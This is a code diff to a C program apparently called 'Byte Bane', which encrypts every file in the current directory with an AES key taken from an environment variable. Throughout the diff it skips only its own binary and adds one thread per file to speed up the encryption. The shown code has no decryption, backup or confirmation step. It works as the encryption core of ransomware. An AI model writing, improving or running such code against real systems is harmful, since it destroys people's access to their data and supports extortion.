@@ -6,6 +6,7 @@
 #include <pthread.h>
 #include <unistd.h>
 #include <dirent.h>
+#include <pthread.h>
 #define MAX_LINE_LEN 512
 
 int encrypt_file(char * file_path, AES_KEY key){
@@ -66,24 +67,55 @@ int encrypt_file(char * file_path, AES_KEY key){
     return 0;
 }
 
+typedef struct {
+    char *filename;
+    AES_KEY key;
+} thread_args_t;
+
+void* encrypt_file_thread(void *arg) {
+    thread_args_t *args = (thread_args_t*)arg;
+    encrypt_file(args->filename, args->key);
+    free(args->filename);
+    free(args);
+    return NULL;
+}
+
 
 int main() {
-    char * key = getenv("BYTE_BANE_KEY");
+    char *key = getenv("BYTE_BANE_KEY");
     AES_KEY aes_key;
     AES_set_encrypt_key(key, 128, &aes_key);
 
-    DIR * current_dir;
-    struct dirent * dir;
+    DIR *current_dir;
+    struct dirent *dir;
+    
+    GArray *threads = g_array_new(FALSE, FALSE, sizeof(pthread_t));
     
     current_dir = opendir(".");
-    if (current_dir){
-        while ((dir = readdir(current_dir)) != NULL){
-            if (strcmp(dir->d_name, ".") == 0 || strcmp(dir->d_name, "..") == 0 || strcmp(dir->d_name, "main") == 0){
+    if (current_dir) {
+        while ((dir = readdir(current_dir)) != NULL) {
+            if (strcmp(dir->d_name, ".") == 0 || 
+                strcmp(dir->d_name, "..") == 0 || 
+                strcmp(dir->d_name, "main") == 0) {
                 continue;
             }
-            encrypt_file(dir->d_name, aes_key);
+
+            thread_args_t *args = malloc(sizeof(thread_args_t));
+            args->filename = strdup(dir->d_name);
+            args->key = aes_key;
+
+            pthread_t thread;
+            pthread_create(&thread, NULL, encrypt_file_thread, args);
+            g_array_append_val(threads, thread);
         }
+        closedir(current_dir);
     }
 
+    for (guint i = 0; i < threads->len; i++) {
+        pthread_t thread = g_array_index(threads, pthread_t, i);
+        pthread_join(thread, NULL);
+    }
+
+    g_array_free(threads, TRUE);
     return 0;
 }
